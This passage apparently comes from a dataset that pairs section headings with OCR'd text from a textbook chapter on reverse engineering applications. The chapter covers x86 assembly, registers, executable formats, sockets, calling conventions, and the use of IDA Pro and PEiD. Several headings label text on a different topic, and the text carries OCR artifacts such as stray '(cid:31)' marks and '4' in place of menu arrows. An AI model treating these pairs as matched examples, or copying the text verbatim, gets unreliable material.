bits)\nSHR destination, N Shifts the destination to the right by N bits (with right\nbeing lower bits)\nINC destination Increments destination by 1\nDEC destination Decrements destination by 1\nThese mnemonic instructions take one of three forms depending on\nhow many operands the instruction takes. Table 6-2 shows the three differ-\nent forms of operands.\nTable 6-2: Intel Mnemonic Forms\nNumber of operands Form Examples\n0 NAME POP, RET\n1 NAME input PUSH 1; CALL func\n2 NAME output, input MOV EAX, EBX; ADD EDI, 1\nApplication Reverse Engineering 115"
  },
  {
    "input": "CPU Registers",
    "output": "The two common ways to represent x86 instructions in assembly are\nIntel and AT&T syntax. Intel syntax, originally developed by the Intel\nCorporation, is the syntax I use throughout this chapter. AT&T syntax is\nused in many development tools on Unix-like systems. The syntaxes differ\nin a few ways, such as the order in which operands are given. For example,\nthe instruction to add 1 to the value stored in the EAX register would\nlook like this in Intel syntax: ADD EAX, 1 and like this in AT&T Syntax:\naddl $1, %eax.\nCPU Registers\nThe CPU has a number of registers for very fast, temporary storage of the\ncurrent state of execution. In x86, each register is referred to by a two- or\nthree-character label. Figure 6-2 shows the main registers for a 32-bit x86\nprocessor. It’s essential to understand the many types of registers the pro-\ncessor supports because each serves different purposes and is necessary for\nunderstanding how the instructions operate.\nGeneral purpose registers Memory index registers\nEAX ESI\nEBX EDI\nECX ESP\nEDX EBP\nEIP\nSelector registers\nCS DS ES Control registers\nFS GS SS EFLAGS\nFigure 6-2: The main 32-bit x86 registers\nThe x86’s registers are split into four main categories: general purpose,\nmemory index, control, and selector.\nGeneral Purpose Registers\nThe general purpose registers (EAX, EBX, ECX, and EDX in Figure 6-2) are\ntemporary stores for nonspecific values of computation, such as the results\nof addition or subtraction. The general purpose registers are 32 bits in size,\nalthough instructions can access them in 16- and 8-bit versions using a sim-\nple naming convention: for example, a 16-bit version of the EAX register is\naccessed as AX, and the 8-bit versions are AH and AL. Figure 6-3 shows the\norganization of the EAX register.\n116 Chapter 6\nEAX (32 bits)\nAH (8 bits) AL (8 bits)\nAX (16 bits)\nFigure 6-3: EAX general purpose register with\nsmall register components\nMemory Index Registers\nThe memory index registers (ESI, EDI, ESP, EBP, EIP) are mostly general pur-\npose except for the ESP and EIP registers. The ESP register is used by the\nPUSH and POP instructions, as well as during subroutine calls to indicate\nthe current memory location of the base of a stack.\nAlthough you can utilize the ESP register for purposes other than index-\ning into the stack, it’s usually unwise to do so because it might cause memory\ncorruption or unexpected behavior. The reason is that some instructions\nimplicitly rely on the value of the register. On the other hand, the EIP regis-\nter cannot be directly accessed as a general purpose register because it indi-\ncates the next address in memory where an instruction will be read from.\nThe only way to change the value of the EIP register is by using a con-\ntrol instruction, such as CALL, JMP, or RET. For this discussion, the important\ncontrol register is EFLAGS. EFLAGS contains a variety of Boolean flags that\nindicate the results of instruction execution, such as whether the last opera-\ntion resulted in the value 0. These Boolean flags implement conditional\nbranches on the x86 processor. For example, if you subtract two values and\nthe result is 0, the Zero flag in the EFLAGS register will be set to 1, and\nflags that do not apply will be set to 0.\nThe EFLAGS register also contains important system flags, such as\nwhether interrupts are enabled. Not all instructions affect the value of\nEFLAGS. Table 6-3 lists the most important flag values, including the\nflag’s bit position, its common name, and a brief description.\nTable 6-3: Important EFLAGS Status Flags\nBit Name Description\n0 Carry flag Indicates whether a carry bit was generated from the last\noperation\n2 Parity flag The parity of the least-significant byte of the last operation\n6 Zero flag Indicates whether the last operation has zero as its result;\nused in comparison operations\n7 Sign flag Indicates the sign of the last operation; effectively, the\nmost-significant bit of the result\n11 Overflow flag Indicates whether the last operation overflowed\nApplication Reverse Engineering 117"
  },
  {
    "input": "Program Flow",
    "output": "Selector Registers\nThe selector registers (CS, DS, ES, FS, GS, SS) address memory locations by\nindicating a specific block of memory into which you can read or write. The\nreal memory address used in reading or writing the value is looked up in an\ninternal CPU table.\nNOTE Selector registers are usually only used in operating system–specific operations. For\nexample, on Windows, the FS register is used to access memory allocated to store the\ncurrent thread’s control information.\nMemory is accessed using little endian byte order. Recall from Chapter 3\nthat little endian order means the least-significant byte is stored at the lowest\nmemory address.\nAnother important feature of the x86 architecture is that it doesn’t\nrequire its memory operations to be aligned. All reads and writes to main\nmemory on an aligned processor architecture must be aligned to the size\nof the operation. For example, if you want to read a 32-bit value, you would\nhave to read from a memory address that is a multiple of 4. On aligned\narchitectures, such as SPARC, reading an unaligned address would gener-\nate an error. Conversely, the x86 architecture permits you to read from or\nwrite to any memory address regardless of alignment.\nUnlike architectures such as ARM, which use specialized instructions\nto load and store values between the CPU registers and main memory,\nmany of the x86 instructions can take memory addresses as operands. In\nfact, the x86 supports a complex memory-addressing format for its instruc-\ntions: each memory address reference can contain a base register, an index\nregister, a multiplier for the index (between 1 and 8), or a 32-bit offset. For\nexample, the following MOV instruction combines all four of these refer-\nencing options to determine which memory address contains the value to\nbe copied into the EAX register:\nMOV EAX, [ESI + EDI * 8 + 0x50] ; Read 32-bit value from memory address\nWhen a complex address reference like this is used in an instruction,\nit’s common to see it enclosed in square brackets.\nProgram Flow\nProgram flow, or control flow, is how a program determines which instructions\nto execute. The x86 has three main types of program flow instructions: sub-\nroutine calling, conditional branches, and unconditional branches. Subroutine call-\ning redirects the flow of the program to a subroutine—a specified sequence\nof instructions. This is achieved with the CALL instruction, which changes\nthe EIP register to the location of the subroutine. CALL places the memory\naddress of the next instruction onto the current stack, which tells the pro-\ngram flow where to return after it has performed its subroutine task. The\nreturn is performed using the RET instruction, which changes the EIP regis-\nter to the top address in the stack (the one CALL put there).\n118 Chapter 6"
  },
  {
    "input": "Executable File Formats",
    "output": "Conditional branches allow the code to make decisions based on prior\noperations. For example, the CMP instruction compares the values of two\noperands (perhaps two registers) and calculates the appropriate values\nfor the EFLAGS register. Under the hood, the CMP instruction does this by\nsubtracting one value from the other, setting the EFLAGS register as appro-\npriate, and then discarding the result. The TEST instruction does the same\nexcept it performs an AND operation instead of a subtraction.\nAfter the EFLAGS value has been calculated, a conditional branch\ncan be executed; the address it jumps to depends on the state of EFLAGS.\nFor example, the JZ instruction will conditionally jump if the Zero flag is\nset (which would happen if, for instance, the CMP instruction compared two\nvalues that were equal); otherwise, the instruction is a no-operation. Keep\nin mind that the EFLAGS register can also be set by arithmetic and other\ninstructions. For example, the SHL instruction shifts the value of a destina-\ntion by a certain number of bits from low to high.\nUnconditional branching program flow is implemented through the\nJMP instruction, which just jumps unconditionally to a destination address.\nThere’s not much more to be said about unconditional branching.\noperating system Basics\nUnderstanding a computer’s architecture is important for both static and\ndynamic reverse engineering. Without this knowledge, it’s difficult to ever\nunderstand what a sequence of instructions does. But architecture is only\npart of the story: without the operating system handling the computer’s\nhardware and processes, the instructions wouldn’t be very useful. Here I’ll\nexplain some of the basics of how an operating system works, which will\nhelp you understand the processes of reverse engineering.\nExecutable File Formats\nExecutable file formats define how executable files are stored on disk.\nOperating systems need to specify the executables they support so they can\nload and run programs. Unlike earlier operating systems, such as MS-DOS,\nwhich had no restrictions on what file formats would execute (when run,\nfiles containing instructions would load directly into memory), modern\noperating systems have many more requirements that necessitate more\ncomplex formats.\nSome requirements of a modern executable format include:\n• Memory allocation for executable instructions and data\n• Support for dynamic linking of external libraries\n• Support for cryptographic signatures to validate the source of the\nexecutable\n• Maintenance of debug information to link executable code to the origi-\nnal source code for debugging purposes\nApplication Reverse Engineering 119"
  },
  {
    "input": "Processes and Threads",
    "output": "• A reference to the address in the executable file where code begins\nexecuting, commonly called the start address (necessary because the\nprogram’s start address might not be the first instruction in the execut-\nable file)\nWindows uses the Portable Executable (PE) format for all executables\nand dynamic libraries. Executables typically use the .exe extension, and\ndynamic libraries use the .dll extension. Windows doesn’t actually need\nthese extensions for a new process to work correctly; they are used just for\nconvenience.\nMost Unix-like systems, including Linux and Solaris, use the Executable\nLinking Format (ELF) as their primary executable format. The major excep-\ntion is macOS, which uses the Mach-O format.\nSections\nMemory sections are probably the most important information stored in an\nexecutable. All nontrivial executables will have at least three sections: the\ncode section, which contains the native machine code for the executable;\nthe data section, which contains initialized data that can be read and writ-\nten during execution; and a special section to contain uninitialized data.\nEach section has a name that identifies the data it contains. The code sec-\ntion is usually called text, the data section is called data, and the uninitial-\nized data is called bss.\nEvery section contains four basic pieces of information:\n• A text name\n• A size and location of the data for the section contained in the execut-\nable file\n• The size and address in memory where the data should be loaded\n• Memory protection flags, which indicate whether the section can be\nwritten or executed when loaded into memory\nProcesses and Threads\nAn operating system must be able to run multiple instances of an execut-\nable concurrently without them conflicting. To do so, operating systems\ndefine a process, which acts as a container for an instance of a running exe-\ncutable. A process stores all the private memory the instance needs to oper-\nate, isolating it from other instances of the same executable. The process\nis also a security boundary, because it runs under a particular user of the\noperating system and security decisions can be made based on this identity.\nOperating systems also define a thread of execution, which allows the\noperating system to rapidly switch between multiple processes, making it\nseem to the user that they’re all running at the same time. This is called\nmultitasking. To switch between processes, the operating system must\n120 Chapter 6"
  },
  {
    "input": "Operating System Networking Interface",
    "output": "interrupt what the CPU is doing, store the current process’s state, and\nrestore an alternate process’s state. When the CPU resumes, it is running\nanother process.\nA thread defines the current state of execution. It has its own block of\nmemory for a stack and somewhere to store its state when the operating\nsystem stops the thread. A process will usually have at least one thread,\nand the limit on the number of threads in the process is typically con-\ntrolled by the computer’s resources.\nTo create a new process from an executable file, the operating system\nfirst creates an empty process with its own allocated memory space. Then\nthe operating system loads the main executable into the process’s memory\nspace, allocating memory based on the executable’s section table. Next, a\nnew thread is created, which is called the main thread.\nThe dynamic linking program is responsible for linking in the main exe-\ncutable’s system libraries before jumping back to the original start address.\nWhen the operating system launches the main thread, the process creation\nis complete.\nOperating System Networking Interface\nThe operating system must manage a computer’s networking hardware so it\ncan be shared between all running applications. The hardware knows very\nlittle about higher-level protocols, such as TCP/IP,2 so the operating system\nmust provide implementations of these higher-level protocols.\nThe operating system also needs to provide a way for applications to\ninterface with the network. The most common network API is the Berkeley\nsockets model, originally developed at the University of California, Berkeley in\nthe 1970s for BSD. All Unix-like systems have built-in support for Berkeley\nsockets. On Windows, the Winsock library provides a very similar program-\nming interface. The Berkeley sockets model is so prevalent that you’ll almost\ncertainly encounter it on a wide range of platforms.\nCreating a Simple TCP Client Connection to a Server\nTo get a better sense of how the sockets API works, Listing 6-1 shows how to\ncreate a simple TCP client connection to a remote server.\nint port = 12345;\nconst char* ip = \"1.2.3.4\";\nsockaddr_in addr = {0};\n int s = socket(AF_INET, SOCK_STREAM, 0);\naddr.sin_family = PF_INET;\n addr.sin_port = htons(port);\n inet_pton(AF_INET, ip, &addr.sin_addr);\n2. This isn’t completely accurate: many network cards can perform some processing in\nhardware.\nApplication Reverse Engineering 121\nx if(connect(s, (sockaddr*) &addr, sizeof(addr)) == 0)\n{\nchar buf[1024];\ny int len = recv(s, buf, sizeof(buf), 0);\nz send(s, buf, len, 0);\n}\nclose(s);\nListing 6-1: A simple TCP network client\nThe first API call  creates a new socket. The AF_INET parameter indi-\ncates we want to use the IPv4 protocol. (To use IPv6 instead, we would write\nAF_INET6). The second parameter SOCK_STREAM indicates that we want to use a\nstreaming connection, which for the internet means TCP. To create a UDP\nsocket, we would write SOCK_DGRAM (for datagram socket).\nNext, we construct a destination address with addr, an instance of the\nsystem-defined sockaddr_in structure. We set up the address structure with the\nprotocol type, the TCP port, and the TCP IP address. The call to inet_pton \nconverts the string representation of the IP address in ip to a 32-bit integer.\nNote that when setting the port, the htons function is used  to convert\nthe value from host-byte-order (which for x86 is little endian) to network-\nbyte-order (always big endian). This applies to the IP address as well. In this\ncase, the IP address 1.2.3.4 will become the integer 0x01020304 when stored\nin big endian format.\nThe final step is to issue the call to connect to the destination address x.\nThis is the main point of failure, because at this point the operating system\nhas to make an outbound call to the destination address to see whether any-\nthing is listening. When the new socket connection is established, the pro-\ngram can read and write data to the socket as if it were a file via the recv y\nand send z system calls. (On Unix-like systems, you can also use the general\nread and write calls, but not on Windows.)\nCreating a Client Connection to a TCP Server\nListing 6-2 shows a snippet of the other side of the network connection, a\nvery simple TCP socket server.\nsockaddr_in bind_addr = {0};\nint s = socket(AF_INET, SOCK_STREAM, 0);\nbind_addr.sin_family = AF_INET;\nbind_addr.sin_port = htons(12345);\n inet_pton(\"0.0.0.0\", &bind_addr.sin_addr);\n bind(s, (sockaddr*)&bind_addr, sizeof(bind_addr));\n listen(s, 10);\n122 Chapter 6"
  },
  {
    "input": "Application Binary Interface",
    "output": "sockaddr_in client_addr;\nint socksize = sizeof(client_addr);\nx int newsock = accept(s, (sockaddr*)&client_addr, &socksize);\n// Do something with the new socket\nListing 6-2: A simple TCP socket server\nThe first important step when connecting to a TCP socket server is to\nbind the socket to an address on the local network interface, as shown at\n and . This is effectively the opposite of the client case in Listing 6-1\nbecause inet_pton()  just converts a string IP address to its binary form.\nThe socket is bound to all network addresses, as signified by \"0.0.0.0\",\nalthough this could instead be a specific address on port 12345.\nThen, the socket is bound to that local address . By binding to all\ninterfaces, we ensure the server socket will be accessible from outside the\ncurrent system, such as over the internet, assuming no firewall is in the way.\nFinally, the listing asks the network interface to listen for new incoming\nconnections  and calls accept x, which returns the next new connection.\nAs with the client, this new socket can be read and written to using the recv\nand send calls.\nWhen you encounter native applications that use the operating system\nnetwork interface, you’ll have to track down all these function calls in the\nexecutable code. Your knowledge of how programs are written at the C pro-\ngramming language level will prove valuable when you’re looking at your\nreversed code in a disassembler.\nApplication Binary Interface\nThe application binary interface (ABI) is an interface defined by the operating\nsystem to describe the conventions of how an application calls an API func-\ntion. Most programming languages and operating systems pass parameters\nleft to right, meaning that the leftmost parameter in the original source\ncode is placed at the lowest stack address. If the parameters are built by\npushing them to a stack, the last parameter is pushed first.\nAnother important consideration is how the return value is provided to\nthe function’s caller when the API call is complete. In the x86 architecture,\nas long as the value is less than or equal to 32 bits, it’s passed back in the\nEAX register. If the value is between 32 and 64 bits, it’s passed back in a\ncombination of EAX and EDX.\nBoth EAX and EDX are considered scratch registers in the ABI, mean-\ning that their register values are not preserved across function calls: in\nother words, when calling a function, the caller can’t rely on any value\nstored in these registers to still exist when the call returns. This model of\ndesignating registers as scratch is done for pragmatic reasons: it allows\nfunctions to spend less time and memory saving registers, which might not\nbe modified anyway. In fact, the ABI specifies an exact list of which regis-\nters must be saved into a location on the stack by the called function.\nApplication Reverse Engineering 123\nTable 6-4 contains a quick description of the typical register assign-\nment’s purpose. The table also indicates whether the register must be saved\nwhen calling a function in order for the register to be restored to its origi-\nnal value before the function returns.\nTable 6-4: Saved Register List\nRegister ABI usage Saved?\nEAX Used to pass the return value of the No\nfunction\nEBX General purpose register Yes\nECX Used for local loops and counters, and No\nsometimes used to pass object pointers in\nlanguages such as C++\nEDX Used for extended return values No\nEDI General purpose register Yes\nESI General purpose register Yes\nEBP Pointer to the base of the current valid Yes\nstack frame\nESP Pointer to the base of the stack Yes\nFigure 6-4 shows an add() function being called in the assembly code\nfor the print_add() function: it places the parameters on the stack (PUSH 10),\ncalls the add() function (CALL add), and then cleans up afterward (ADD ESP, 8).\nThe result of the addition is passed back from add() through the EAX regis-\nter, which is then printed to the console.\nvoid print_add() { int add(int a, int b) {\nprintf(\"%d\\n\", add(1, 10)); return a + b;\n} }\nPUSH EBP MOV EAX, [ESP+4] ; EAX = a\nMOV EBP, ESP ADD EAX, [ESP+8] ; EAX = a + b\nRET\nPUSH 10 ; Push parameters\nPUSH 1\nCALL add\nADD ESP, 8 ; Remove parameters\nPUSH EAX\nPUSH OFFSET \"%d\\n\"\nCALL printf\nADD ESP, 8\nPOP EBP\nRET\nFigure 6-4: Function calling in assembly code\n124 Chapter 6"
  },
  {
    "input": "A Quick Guide to Using IDA Pro Free Edition",
    "output": "static reverse engineering\nNow that you have a basic understanding of how programs execute, we’ll\nlook at some methods of reverse engineering. Static reverse engineering is the\nprocess of dissecting an application executable to determine what it does.\nIdeally, we could reverse the compilation process to the original source\ncode, but that’s usually too difficult to do. Instead, it’s more common to\ndisassemble the executable.\nRather than attacking a binary with only a hex editor and a machine\ncode reference, you can use one of many tools to disassemble binaries.\nOne such tool is the Linux-based objdump, which simply prints the disas-\nsembled output to the console or to a file. Then it’s up to you to navigate\nthrough the disassembly using a text editor. However, objdump isn’t very\nuser friendly.\nFortunately, there are interactive disassemblers that present disas-\nsembled code in a form that you can easily inspect and navigate. By far,\nthe most fully featured of these is IDA Pro, which was developed by the\nHex Rays company. IDA Pro is the go-to tool for static reversing, and it\nsupports many common executable formats as well as almost any CPU\narchitecture. The full version is pricey, but a free edition is also available.\nAlthough the free version only disassembles x86 code and can’t be used\nin a commercial environment, it’s perfect for getting you up to speed with\na disassembler. You can download the free version of IDA Pro from the\nHex Rays website at https://www.hex-rays.com/. The free version is only for\nWindows, but it should run well under Wine on Linux or macOS. Let’s\ntake a quick tour of how to use IDA Pro to dissect a simple network binary.\nA Quick Guide to Using IDA Pro Free Edition\nOnce it’s installed, start IDA Pro and then choose the target executable\nby clicking File4Open. The Load a new file window should appear (see\nFigure 6-5).\nThis window displays several options, but most are for advanced users;\nyou only need to consider certain important options. The first option\nallows you to choose the executable format you want to inspect . The\ndefault in the figure, Portable executable, is usually the correct choice,\nbut it’s always best to check. The Processor type  specifies the processor\narchitecture as the default, which is x86. This option is especially important\nwhen you’re disassembling binary data for unusual processor architectures.\nWhen you’re sure the options you chose are correct, click OK to begin\ndisassembly.\nYour choices for the first and second options will depend on the execut-\nable you’re trying to disassemble. In this example, we’re disassembling a\nWindows executable that uses the PE format with an x86 processor. For\nother platforms, such as macOS or Linux, you’ll need to select the appro-\npriate options. IDA will make its best efforts to detect the format necessary\nto disassemble your target, so normally you won’t need to choose. During\nApplication Reverse Engineering 125\ndisassembly, it will do its best to find all executable code, annotate the\ndecompiled functions and data, and determine cross-references between\nareas of the disassembly.\n\n\nFigure 6-5: Options for loading a new file\nBy default, IDA attempts to provide annotations for variable names and\nfunction parameters if it knows about them, such as when calling common\nAPI functions. For cross-references, IDA will find the locations in the disas-\nsembly where data and code are referenced: you can look these up when\nyou’re reverse engineering, as you’ll soon see. Disassembly can take a long\ntime. When the process is complete, you should have access to the main\nIDA interface, as shown in Figure 6-6.\nThere are three important windows to pay attention to in IDA’s main\ninterface. The window at  is the default disassembly view. In this example,\nit shows the IDA Pro graph view, which is often a very useful way to view an\nindividual function’s flow of execution. To display a native view showing the\ndisassembly in a linear format based on the loading address of instructions,\npress the spacebar. The window at  shows the status of the disassembly pro-\ncess as well as any errors that might occur if you try to perform an operation\nin IDA that it doesn’t understand. The tabs of the open windows are at .\nYou can open additional windows in IDA by selecting View4Open sub-\nviews. Here are some windows you’ll almost certainly need and what they\ndisplay:\nIDA View Shows the disassembly of the executable\nExports Shows any functions exported by the executable\nImports Shows any functions dynamically linked into this executable\nat runtime\n126 Chapter 6\nFunctions Shows a list of all functions that IDA Pro has identified\nStrings Shows a list of printable strings that IDA Pro has identified\nduring analysis\n(cid:31)\n(cid:30)\n(cid:29)\nFigure 6-6: The main IDA Pro interface\nOf the five window types listed, the last four are basically just lists of\ninformation. The IDA View is where you’ll spend most of your time when\nyou’re reverse engineering, because it shows you the disassembled code. You\ncan easily navigate around the disassembly\nin IDA View. For example, double-click\nanything that looks like a function name\nor data reference to navigate automatically\nto the location of the reference. This tech-\nnique is especially useful when you’re ana-\nlyzing calls to other functions: for instance,\nif you see CALL sub_400100, just double-click\nthe sub_400100 portion to be taken directly\nto the function. You can go to the original Figure 6-7: The back button for\nthe IDA Pro disassembly window\ncaller by pressing the Esc key or the back\nbutton, highlighted in Figure 6-7.\nIn fact, you can navigate back and forth in the disassembly window as\nyou would in a web browser. When you find a reference string in the text,\nApplication Reverse Engineering 127"
  },
  {
    "input": "Analyzing Stack Variables and Arguments",
    "output": "move the text cursor to the reference and press X or right-click and choose\nJump to xref to operand to bring up a cross-reference dialog that shows\na list of all locations in the executable referencing that function or data\nvalue. Double-click an entry to navigate directly to the reference in the dis-\nassembly window.\nNOTE By default, IDA will generate automatic names for referenced values. For example,\nfunctions are named sub_XXXX, where XXXX is their memory address; the name\nloc_XXXX indicates branch locations in the current function or locations that are\nnot contained in a function. These names may not help you understand what\nthe disassembly is doing, but you can rename these references to make them more\nmeaningful. To rename references, move the cursor to the reference text and press N\nor right-click and select Rename from the menu. The changes to the name should\npropagate everywhere it is referenced.\nAnalyzing Stack Variables and Arguments\nAnother feature in IDA’s disassembly window is its analysis of stack variables\nand arguments. When I discussed calling conventions in “Application Binary\nInterface” on page 123, I indicated that parameters are generally passed on\nthe stack, but that the stack also stores temporary local variables, which are\nused by functions to store important values that can’t fit into the available\nregisters. IDA Pro will analyze the function and determine how many argu-\nments it takes and which local variables it uses. Figure 6-8 shows these vari-\nables at the start of a disassembled function as well as a few instructions that\nuse these variables.\nLocal variables\nPassed arguments\nUses of stack\nFigure 6-8: A disassembled function showing local variables and arguments\nYou can rename these local variables and arguments and look up all\ntheir cross-references, but cross-references for local variables and argu-\nments will stay within the same function.\n128 Chapter 6"
  },
  {
    "input": "Identifying Key Functionality ",
    "output": "Identifying Key Functionality\nNext, you need to determine where the executable you’re disassembling\nhandles the network protocol. The most straightforward way to do this is\nto inspect all parts of the executable in turn and determine what they do.\nBut if you’re disassembling a large commercial product, this method is very\ninefficient. Instead, you’ll need a way to quickly identify areas of functional-\nity for further analysis. In this section, I’ll discuss four typical approaches\nfor doing so, including extracting symbolic information, looking up which\nlibraries are imported into the executable, analyzing strings, and identify-\ning automated code.\nExtracting Symbolic Information\nCompiling source code into a native executable is a lossy process, espe-\ncially when the code includes symbolic information, such as the names of\nvariables and functions or the form of in-memory structures. Because this\ninformation is rarely needed for a native executable to run correctly, the\ncompilation process may just discard it. But dropping this information\nmakes it very difficult to debug problems in the built executable.\nAll compilers support the ability to convert symbolic information and\ngenerate debug symbols with information about the original source code line\nassociated with an instruction in memory as well as type information for\nfunctions and variables. However, developers rarely leave in debug symbols\nintentionally, choosing instead to remove them before a public release to\nprevent people from discovering their proprietary secrets (or bad code).\nStill, sometimes developers slip up, and you can take advantage of those\nslipups to aid reverse engineering.\nIDA Pro loads debug symbols automatically whenever possible, but\nsometimes you’ll need to hunt down the symbols on your own. Let’s look\nat the debug symbols used by Windows, macOS, and Linux, as well as where\nthe symbolic information is stored and how to get IDA to load it correctly.\nWhen a Windows executable is built using common compilers (such as\nMicrosoft Visual C++), the debug symbol information isn’t stored inside the\nexecutable; instead, it’s stored in a section of the executable that provides\nthe location of a program database (PDB) file. In fact, all the debug informa-\ntion is stored in this PDB file. The separation of the debug symbols from\nthe executable makes it easy to distribute the executable without debug\ninformation while making that information readily available for debugging.\nPDB files are rarely distributed with executables, at least in closed-\nsource software. But one very important exception is Microsoft Windows.\nTo aid debugging efforts, Microsoft releases public symbols for most exe-\ncutables installed as part of Windows, including the kernel. Although these\nPDB files don’t contain all the debug information from the compilation\nprocess (Microsoft strips out information they don’t want to make public,\nApplication Reverse Engineering 129\nsuch as detailed type information), the files still contain most of the func-\ntion names, which is often what you want. The upshot is that when reverse\nengineering Windows executables, IDA Pro should automatically look up\nthe symbol file on Microsoft’s public symbol server and process it. If you\nhappen to have the symbol file (because it came with the executable), load\nit by placing it next to the executable in a directory and then have IDA Pro\ndisassemble the executable. You can also load PDB files after initial disas-\nsembly by selecting File4Load File4PDB File.\nDebug symbols are most significant in reverse engineering in IDA Pro\nwhen naming functions in the disassembly and Functions windows. If the\nsymbols also contain type information, you should see annotations on the\nfunction calls that indicate the types of parameters, as shown in Figure 6-9.\nFigure 6-9: Disassembly with debug symbols\nEven without a PDB file, you might be able to access some symbolic\ninformation from the executable. Dynamic libraries, for example, must\nexport some functions for another executable to use: that export will pro-\nvide some basic symbolic information, including the names of the external\nfunctions. From that information, you should be able to drill down to find\nwhat you’re looking for in the Exports window. Figure 6-10 shows what this\ninformation would look like for the ws2_32.dll Windows network library.\n130 Chapter 6\nFigure 6-10: Exports from the ws2_32 .dll library\nDebug symbols work similarly on macOS, except debugging informa-\ntion is contained in a debugging symbols package (dSYM), which is created\nalongside the executable rather than in a single PDB file. The dSYM pack-\nage is a separate macOS package directory and is rarely distributed with\ncommercial applications. However, the Mach-O executable format can store\nbasic symbolic information, such as function and data variable names, in\nthe executable. A developer can run a tool called Strip, which will remove\nall this symbolic information from a Mach-O binary. If they do not run\nStrip, then the Mach-O binary may still contain useful symbolic informa-\ntion for reverse engineering.\nOn Linux, ELF executable files package all debug and other symbolic\ninformation into a single executable file by placing debugging informa-\ntion into its own section in the executable. As with macOS, the only way to\nremove this information is with the Strip tool; if the developer fails to do\nso before release, you might be in luck. (Of course, you’ll have access to the\nsource code for most programs running on Linux.)\nViewing Imported Libraries\nOn a general purpose operating system, calls to network APIs aren’t likely\nto be built directly into the executable. Instead, functions will be dynami-\ncally linked at runtime. To determine what an executable imports dynami-\ncally, view the Imports window in IDA Pro, as shown in Figure 6-11.\nIn the figure, various network APIs are imported from the ws2_32.dll\nlibrary, which is the BSD sockets implementation for Windows. When you\ndouble-click an entry, you should see the import in a disassembly window.\nFrom there, you can find references to that function by using IDA Pro to\nshow the cross-references to that address.\nApplication Reverse Engineering 131\nFigure 6-11: The Imports window\nIn addition to network functions, you might also see that various cryp-\ntographic libraries have been imported. Following these references can lead\nyou to where encryption is used in the executable. By using this imported\ninformation, you may be able to trace back to the original callee to find out\nhow it’s been used. Common encryption libraries include OpenSSL and the\nWindows Crypt32.dll.\nAnalyzing Strings\nMost applications contain strings with printable text information, such\nas text to display during application execution, text for logging purposes,\nor text left over from the debugging process that isn’t used. The text, espe-\ncially internal debug information, might hint at what a disassembled func-\ntion is doing. Depending on how the developer added debug information,\nyou might find the function name, the original C source code file, or even\nthe line number in the source code where the debug string was printed.\n(Most C and C++ compilers support a syntax to embed these values into a\nstring during compilation.)\nIDA Pro tries to find printable text strings as part of its analysis process.\nTo display these strings, open the Strings window. Click a string of interest,\nand you’ll see its definition. Then you can attempt to find references to the\nstring that should allow you to trace back to the functionality associated\nwith it.\nString analysis is also useful for determining which libraries an execut-\nable was statically linked with. For example, the ZLib compression library\nis commonly statically linked, and the linked executable should always con-\ntain the following string (the version number might differ):\ninflate 1.2.8 Copyright 1995-2013 Mark Adler\nBy quickly discovering which libraries are included in an executable,\nyou might be able to successfully guess the structure of the protocol.\n132 Chapter 6\nIdentifying Automated Code\nCertain types of functionality lend themselves to automated identification.\nFor example, encryption algorithms typically have several magic constants\n(numbers defined by the algorithm that are chosen for particular math-\nematical properties) as part of the algorithm. If you find these magic con-\nstants in the executable, you know a particular encryption algorithm is at\nleast compiled into the executable (though it isn’t necessarily used). For\nexample, Listing 6-3 shows the initialization of the MD5 hashing algorithm,\nwhich uses magic constant values.\nvoid md5_init( md5_context *ctx )\n{\nctx->state[0] = 0x67452301;\nctx->state[1] = 0xEFCDAB89;\nctx->state[2] = 0x98BADCFE;\nctx->state[3] = 0x10325476;\n}\nListing 6-3: MD5 initialization showing magic constants\nArmed with knowledge of the MD5 algorithm, you can search for\nthis initialization code in IDA Pro by selecting a disassembly window and\nchoosing Search4Immediate value. Complete the dialog as shown in\nFigure 6-12 and click OK.\nFigure 6-12: The IDA Pro search box for\nMD5 constant\nIf MD5 is present, your search should display a list of places where that\nunique value is found. Then you can switch to the disassembly window to\ntry to determine what code uses that value. You can also use this technique\nwith algorithms, such as the AES encryption algorithm, which uses special\ns-box structures that contain similar magic constants.\nHowever, locating algorithms using IDA Pro’s search box can be time\nconsuming and error prone. For example, the search in Figure 6-12 will\npick up MD5 as well as SHA-1, which uses the same four magic constants\nApplication Reverse Engineering 133"
  },
  {
    "input": "Dynamic Reverse Engineering",
    "output": "(and adds a fifth). Fortunately, there are tools that can do these searches\nfor you. One example, PEiD (available from http://www.softpedia.com/get/\nProgramming/Packers-Crypters-Protectors/PEiD-updated.shtml), determines\nwhether a Windows PE file is packed with a known packing tool, such as\nUPX. It includes a few plug-ins, one of which will detect potential encryp-\ntion algorithms and indicate where in the executable they are referenced.\nTo use PEiD to detect cryptographic algorithms, start PEiD and\nclick the top-right button … to choose a PE executable to analyze. Then\nrun the plug-in by clicking the button on the bottom right and selecting\nPlugins4Krypto Analyzer. If the executable contains any cryptographic\nalgorithms, the plug-in should identify them and display a dialog like the\none in Figure 6-13. You can then enter the referenced address value  into\nIDA Pro to analyze the results.\n(cid:31)\nFigure 6-13: The result of PEiD cryptographic\nalgorithm analysis\ndynamic reverse engineering\nDynamic reverse engineering is about inspecting the operation of a running\nexecutable. This method of reversing is especially useful when analyzing\ncomplex functionality, such as custom cryptography or compression rou-\ntines. The reason is that instead of staring at the disassembly of complex\nfunctionality, you can step through it one instruction at a time. Dynamic\nreverse engineering also lets you test your understanding of the code by\nallowing you to inject test inputs.\nThe most common way to perform dynamic reverse engineering is to\nuse a debugger to halt a running application at specific points and inspect\ndata values. Although several debugging programs are available to choose\nfrom, we’ll use IDA Pro, which contains a basic debugger for Windows\napplications and synchronizes between the static and debugger view. For\nexample, if you rename a function in the debugger, that change will be\nreflected in the static disassembly.\n134 Chapter 6"
  },
  {
    "input": "Debugger Windows",
